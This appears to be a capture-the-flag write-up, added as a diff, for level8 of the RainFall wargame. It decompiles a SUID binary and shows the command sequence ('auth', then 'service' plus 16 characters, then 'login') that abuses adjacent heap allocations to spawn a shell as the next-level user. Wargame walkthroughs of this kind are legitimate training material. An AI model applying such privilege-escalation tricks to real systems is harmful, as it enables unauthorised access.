@@ -1,0 +1,196 @@
+When we change to level8 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
+```
+
+We find another SUID executable, this time owned by level8.
+
+```shell
+level8@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level9 users 5366 Mar  6  2016 level8
+```
+
+When executing, it prompts for input and prints two nil addresses.
+
+```shell
+level8@RainFall:~$ ./level8
+(nil), (nil)
+42
+(nil), (nil)
+exit
+(nil), (nil)
+q
+(nil), (nil)
+^C
+```
+
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level8@192.168.184.128:/home/user/level8/level8 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+level8@192.168.184.128's password:
+level8                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this:
+
+```C
+undefined4 main(void)
+{
+  char cVar1;
+  char *pcVar2;
+  int iVar3;
+  uint uVar4;
+  byte *pbVar5;
+  byte *pbVar6;
+  bool bVar7;
+  undefined uVar8;
+  undefined uVar9;
+  bool bVar10;
+  undefined uVar11;
+  byte bVar12;
+  byte local_90 [5];
+  char local_8b [2];
+  char acStack_89 [125];
+  
+  bVar12 = 0;
+  do {
+    printf("%p, %p \n",auth,service);
+    pcVar2 = fgets((char *)local_90,0x80,stdin);
+    bVar7 = false;
+    bVar10 = pcVar2 == (char *)0x0;
+    if (bVar10) {
+      return 0;
+    }
+    iVar3 = 5;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"auth ";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      bVar7 = *pbVar5 < *pbVar6;
+      bVar10 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while (bVar10);
+    uVar8 = 0;
+    uVar11 = (!bVar7 && !bVar10) == bVar7;
+    if ((bool)uVar11) {
+      auth = (undefined4 *)malloc(4);
+      *auth = 0;
+      uVar4 = 0xffffffff;
+      pcVar2 = local_8b;
+      do {
+        if (uVar4 == 0) break;
+        uVar4 = uVar4 - 1;
+        cVar1 = *pcVar2;
+        pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
+      } while (cVar1 != '\0');
+      uVar4 = ~uVar4 - 1;
+      uVar8 = uVar4 < 0x1e;
+      uVar11 = uVar4 == 0x1e;
+      if (uVar4 < 0x1f) {
+        strcpy((char *)auth,local_8b);
+      }
+    }
+    iVar3 = 5;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"reset";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar8 = *pbVar5 < *pbVar6;
+      uVar11 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar11);
+    uVar9 = 0;
+    uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
+    if ((bool)uVar8) {
+      free(auth);
+    }
+    iVar3 = 6;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"service";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar9 = *pbVar5 < *pbVar6;
+      uVar8 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar8);
+    uVar11 = 0;
+    uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
+    if ((bool)uVar8) {
+      uVar11 = (byte *)0xfffffff8 < local_90;
+      uVar8 = acStack_89 == (char *)0x0;
+      service = strdup(acStack_89);
+    }
+    iVar3 = 5;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"login";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar11 = *pbVar5 < *pbVar6;
+      uVar8 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar8);
+    if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
+      if (auth[8] == 0) {
+        fwrite("Password:\n",1,10,stdout);
+      }
+      else {
+        system("/bin/sh");
+      }
+    }
+  } while( true );
+}
+```
+
+After inspecting the decompiled code we learn that our input is compared against multiple strings like ``auth ``, ``service``, ``reset`` and ``login``. If we use those, the memory addresses of the global variables ``auth `` and ``service`` are printed.
+
+```shell
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+```
+
+We also learn from the instruction graph, that ``[eax + 0x20]`` must not be zero in order to trigger the else condition that will spawn a shell for us. 
+
+
+![](https://cdn.discordapp.com/attachments/833692533162901504/1121128126995496990/image.png)
+
+
+This means we simply need to allocate ``auth `` first, followed by ``service`` with random values that are not zero. From previous allocations we already know that ``service`` is 16 bytes big and ``0x20`` is 32 bytes in decimal, which means we need at least 16 more characters after our ``service`` input that will be copied over by the ``strcpy``. Only then we can use the ``login``.
+
+```shell
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service0123456789abcdef
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+```
